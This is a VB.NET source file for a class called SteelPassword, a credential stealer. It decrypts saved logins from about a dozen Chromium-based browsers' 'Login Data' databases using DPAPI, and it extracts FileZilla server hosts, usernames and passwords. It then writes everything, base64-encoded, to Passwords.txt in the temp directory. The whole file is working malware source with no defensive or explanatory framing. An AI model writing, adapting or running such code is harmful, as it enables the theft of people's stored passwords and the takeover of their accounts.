Imports System.IO
Imports System.Text
Imports System.Security.Cryptography
Imports System.Windows.Forms

Public Class SteelPassword
    Dim Data As String
    Public a As String
    Public Paths As String = IO.Path.GetTempPath & "/"
    Public Function Dump()
        Try
            Dim TextBox1 As New TextBox
            TextBox1.Multiline = True
            FileZillaStealer()
            Dim ChromiumPaths As String() = {
                                "Google\Chrome\User Data\Default\Login Data",
                                "Vivaldi\\User Data\Default\Login Data",
                                "Chromium\User Data\Default\Login Data",
                                "Torch\User Data\Default\Login Data",
                                "Comodo\Dragon\\User Data\Default\\Login Data",
                                "Xpom\User Data\Default\Login Data",
                                "Orbitum\\ser Data\Default\Login Data",
                                "Kometa\User Data\Default\Login Data",
                                "Amigo\User Data\Default\Login Data",
                                "Nichrome\\User Data\Default\Login Data",
                                "BraveSoftware\Brave-Browser\User Data\Default\Login Data"
                            }
            For Each ChromiumPath As String In ChromiumPaths
                If File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)) Then
                    Try
                        Dim loginPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)
                        Dim sb As New StringBuilder
                        Dim sqlDataBase As New SqLiteHandler(loginPath)
                        sqlDataBase.ReadTable("logins")
                        Dim count As Integer = sqlDataBase.GetRowCount()
                        For i = 0 To count - 1
                            Dim mUrl As String = sqlDataBase.GetValue(i, "origin_url")
                            Dim mUserName As String = sqlDataBase.GetValue(i, "username_value")
                            Dim mPassword As String = Decode(sqlDataBase.GetValue(i, "password_value"))
                            If (mUserName = "" Or mPassword = "") Then

                            Else
                                TextBox1.AppendText(mUrl & "," & mUserName & "," & mPassword & vbNewLine)
                            End If
                        Next i
                    Catch ex As Exception

                    End Try
                Else

                End If
            Next
            If Not (Data = "") Then
                TextBox1.AppendText(ENB(Data))
            End If
            If TextBox1.Text = "" Then
                Return False
            Else
                IO.File.WriteAllText(Paths & "Passwords.txt", ENB(TextBox1.Text))
            End If
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Private Function Decode(ByVal data As String) As String
        If String.IsNullOrEmpty(data) Then
            Return String.Empty
        Else
            Dim encryptedData As Byte() = Encoding.Default.GetBytes(data)
            Dim decryptedData As Byte() = ProtectedData.Unprotect(encryptedData, Nothing, DataProtectionScope.CurrentUser)
            Return Encoding.UTF8.GetString(decryptedData)
        End If
    End Function
    Public Sub FileZillaStealer()
        Try
            Dim datafile As String() = Split(IO.File.ReadAllText(Environ("APPDATA") & "\FileZilla\recentservers.xml"), "<Server>")
            For Each user As String In datafile
                Dim spliter = Split(user, vbNewLine)
                For Each I As String In spliter
                    If I.Contains("<Host>") Then
                        Data += Split(Split(I, "<Host>")(1), "</Host>")(0) & ","
                    End If
                    If I.Contains("<User>") Then
                        Data += Split(Split(I, "<User>")(1), "</User>")(0) & ","
                    End If
                    If I.Contains("<Pass " & My.Resources.String1 & ">") Then
                        Data += DEB(Split(Split(I, "<Pass " & My.Resources.String1 & ">")(1), "</Pass>")(0))
                    End If
                    If I.Contains("<Pass>") Then
                        Data += Split(Split(I, "<Pass>")(1), "</Pass>")(0)
                    End If
                Next
            Next

        Catch
            Data += ""
        End Try
    End Sub
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
End Class